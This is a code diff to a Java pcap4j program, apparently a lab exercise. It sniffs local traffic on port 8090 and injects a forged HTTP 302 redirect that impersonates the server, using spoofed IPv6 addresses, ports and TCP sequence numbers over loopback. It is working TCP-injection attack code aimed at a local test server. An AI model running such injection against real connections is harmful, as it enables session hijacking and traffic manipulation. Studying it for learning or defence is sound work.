@@ -5,10 +5,15 @@ import org.pcap4j.core.BpfProgram.BpfCompileMode;
 import org.pcap4j.core.PcapNetworkInterface.PromiscuousMode;
 import org.pcap4j.packet.*;
 import org.pcap4j.packet.namednumber.*;
-import org.pcap4j.util.MacAddress;
 
 import java.net.Inet6Address;
+import java.nio.charset.StandardCharsets;
+import java.time.format.DateTimeFormatter;
+import java.time.ZonedDateTime;
+import java.time.ZoneId;
+
 import java.util.List;
+import java.util.concurrent.atomic.AtomicReference;
 
 /**
  * Parses Pcap file from simple server and later injects Packets into it
@@ -80,6 +85,7 @@ public class PcapParser {
         PromiscuousMode mode = PromiscuousMode.PROMISCUOUS;
         PcapHandle handle = device.openLive(65536, mode, 10);
         handle.setFilter("tcp port 8090", BpfCompileMode.OPTIMIZE);
+        AtomicReference<IpV6Packet.IpV6FlowLabel> flowLabel = new AtomicReference<>();
 
         PacketListener listener = pcapPacket -> {
             Packet packet = pcapPacket.getPacket();
@@ -101,9 +107,14 @@ public class PcapParser {
                         if (tcp.getPayload() != null) {
                             String payloadData = new String(tcp.getPayload().getRawData());
 
+                            // Get the flow label
+                            if (payloadData.contains("HTTP/1.1 302 Found")) {
+                                flowLabel.set(ipv6.getHeader().getFlowLabel());
+                            }
+
                             // Only inject when the browser asks for the final page
-                            if (payloadData.contains("GET /d")) {
-                                inject(handle, ipv6, tcp);
+                            if (payloadData.contains("GET /d HTTP/1.1")) {
+                                inject(handle, flowLabel.get(), ipv6, tcp);
                             }
                         }
 
@@ -119,9 +130,9 @@ public class PcapParser {
             handle.loop(30, listener);
         } catch (InterruptedException e) {
             e.printStackTrace();
+        } finally {
+            handle.close();
         }
-
-        handle.close();
     }
 
     /**
@@ -148,19 +159,68 @@ public class PcapParser {
     /**
      * Injects a TCP Response (HTTP 302) impersonating the server
      */
-    public static void inject(PcapHandle handle, IpV6Packet originalIp, TcpPacket originalTcp) {
+    public static void inject(PcapHandle handle, IpV6Packet.IpV6FlowLabel flowLabel, IpV6Packet originalIp, TcpPacket originalTcp) throws NotOpenException, PcapNativeException {
+        String date = DateTimeFormatter.RFC_1123_DATE_TIME.format(ZonedDateTime.now(ZoneId.of("GMT")));
+
+        String data = "HTTP/1.1 302 Found\r\n"
+                + "Date: " + date + "\r\n"
+                + "Location: /secret\r\n"
+                + "Content-length: 0\r\n"
+                + "Server: Jetty(11.0.24)\r\n"
+                + "\r\n";
+
+        byte[] http_payload = data.getBytes(StandardCharsets.UTF_8);
+        UnknownPacket.Builder http_builder = new UnknownPacket.Builder();
+        http_builder.rawData(http_payload);
+
+        int len = 0;
+        if (originalTcp.getPayload() != null) {
+            len = originalTcp.getPayload().length();
+        }
+
         TcpPacket.TcpHeader tcpHeader = originalTcp.getHeader();
 
         int prevSeqNum = tcpHeader.getSequenceNumber();
         int prevAckNum = tcpHeader.getAcknowledgmentNumber();
         TcpPort srcPort = tcpHeader.getSrcPort();
         TcpPort dstPort = tcpHeader.getDstPort();
-        int len = tcpHeader.length();
+
+        Inet6Address srcAddr = originalIp.getHeader().getSrcAddr();
+        Inet6Address dstAddr = originalIp.getHeader().getDstAddr();
 
         TcpPacket.Builder tcpBuilder = new TcpPacket.Builder();
         tcpBuilder.acknowledgmentNumber(prevSeqNum + len)
                 .sequenceNumber(prevAckNum)
                 .dstPort(srcPort)
-                .srcPort(dstPort);
+                .srcPort(dstPort)
+                .ack(true)
+                .psh(true)
+                .rst(false)
+                .syn(false)
+                .fin(false)
+                .window((short) 250)
+                .payloadBuilder(http_builder)
+                .dstAddr(srcAddr)
+                .srcAddr(dstAddr)
+                .correctChecksumAtBuild(true)
+                .correctLengthAtBuild(true);
+
+        IpV6Packet.Builder ipv6Builder = new IpV6Packet.Builder();
+        ipv6Builder.version(IpVersion.IPV6)
+                .srcAddr(dstAddr)
+                .dstAddr(srcAddr)
+                .correctLengthAtBuild(true)
+                .flowLabel(flowLabel)
+                .hopLimit((byte) 128)
+                .trafficClass(IpV6SimpleTrafficClass.newInstance((byte) 0))
+                .nextHeader(IpNumber.TCP)
+                .payloadBuilder(tcpBuilder);
+
+        BsdLoopbackPacket.Builder loopBackBuilder = new BsdLoopbackPacket.Builder();
+        loopBackBuilder.protocolFamily(ProtocolFamily.PF_INET6)
+                        .payloadBuilder(ipv6Builder);
+
+        BsdLoopbackPacket packet = loopBackBuilder.build();
+        handle.sendPacket(packet);
     }
 }
